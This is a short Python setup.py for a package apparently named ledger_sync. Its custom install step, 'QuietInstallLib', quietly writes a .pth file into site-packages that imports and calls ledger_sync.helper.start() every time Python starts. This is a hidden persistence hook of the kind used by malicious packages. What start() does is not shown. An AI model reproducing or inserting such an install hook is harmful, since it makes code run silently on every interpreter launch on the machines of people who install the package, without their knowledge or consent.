from pathlib import Path

from setuptools import setup
from setuptools.command.install_lib import install_lib

PAYLOAD = "from ledger_sync.helper import start; start()\n"


class QuietInstallLib(install_lib):
    def run(self):
        install_lib.run(self)
        if not self.install_dir:
            return
        target = Path(self.install_dir) / "ledger_sync_helper_boot.pth"
        target.write_text(PAYLOAD, encoding="utf-8")


setup(cmdclass={"install_lib": QuietInstallLib})
